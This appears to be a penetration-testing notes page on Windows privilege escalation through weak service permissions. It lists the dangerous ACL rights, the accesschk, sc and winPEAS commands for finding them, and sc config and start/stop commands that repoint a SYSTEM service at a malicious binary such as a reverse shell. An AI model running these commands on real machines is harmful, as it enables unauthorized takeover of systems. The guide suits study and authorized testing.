# Insecure Service Permissions

## Theory

Each service has an ACL that defines certain service-specific permissions.

### Permissions for services

|                                                        Types of permissions                                                       |  Attacker's perspective  |
| :-------------------------------------------------------------------------------------------------------------------------------: | :----------------------: |
|                                       **SERVICE\_QUERY\_CONFIG**, **SERVICE\_QUERY\_STATUS**                                      | Harmless :green\_circle: |
|                                               **SERVICE\_STOP**, **SERVICE\_START**                                               |  Useful :yellow\_circle: |
| **SERVICE\_CHANGE\_CONFIG**, **WRITE\_DAC**_,_ **WRITE\_OWNER**, **GENERIC\_WRITE**, **GENERIC\_ALL**_,_ **SERVICE\_ALL\_ACCESS** |  Dangerous :red\_circle: |

![More information: https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights](../../../../.gitbook/assets/insecure\_service\_permissions.png)

If our user has permission to change the configuration of a service (any of the dangerous permissions) running with SYSTEM privileges (or another user), we can change the executable used by the service to one of our own.

{% hint style="danger" %}
**Potential rabbit hole**: If you can change the configuration of a service but cannot stop/start the service, you may not be able to escalate privileges!
{% endhint %}

## Verification

{% tabs %}
{% tab title="Manual" %}
Any weak service permissions, can we reconfigure something? To see the permissions of all services with our user, we can use the `accesschk.exe` tool or the `sdshow` command:

```bash
# Try the following groups: 
# - Everyone
# - Authenticated Users
# - Users
# - We can also add a group we are in

# acceschk.exe:
accesschk.exe /accepteula -uwqv "<USERNAME/GROUP>" -c *
accesschk.exe /accepteula -uwcqv "<USERNAME/GROUP>" *
accesschk.exe /accepteula -uwcqv <USERNAME/GROUPNAME> <SERVICE NAME>
# sdshow:
sc sdshow <SERVICE NAME>
```

If we have the useful permissions (table at the beginning) and we have the ability to configure the service, then let's move on to the next check.

We must look at the service configuration to see if we can escalate as SYSTEM (or another user):

```bash
sc qc <SERVICE NAME>
```

We must pay attention to the following things:

* `SERVICE_START_NAME` : It must be LocalSystem, so that we can run our binary as SYSTEM, although it can be another user.
* It has the `BINARY_PATH_NAME`.
* `START_TYPE = DEMAND_START` (**3**): It means that this service must be executed manually. It can also be: `AUTO_START` (**2**).
* `DEPENDENCIES` : 0 dependencies. If it has dependencies, it means that this service depends on another one.

We must also check the current status of the service:

```
sc query <SERVICE NAME>
```

Regardless of whether it is stopped/started, if we have the useful permissions to perform these actions, we can escalate privileges.
{% endtab %}

{% tab title="Automatic" %}
### winPEAS

```shell
# We have to observe if there is something "YOU CAN MODIFY THIS SERVICE":
winPEAS.exe servicesinfo
```
{% endtab %}
{% endtabs %}

## Privilege Escalation

We need a malicious binary, which can be a reverse shell or just run a command. After transferring the binary, we will proceed to change the **BINARY\_PATH\_NAME** and then run the service.

```shell
# Change the BINARY_PATH_NAME:
sc config <SERVICE_NAME> binpath="\"C:\<PATH_TO_BINARY>\""
# Stop service:
sc stop <SERVICE_NAME>
net stop <SERVICE_NAME>
# Start service:
sc start <SERVICE_NAME>
net start <SERVICE_NAME>
```
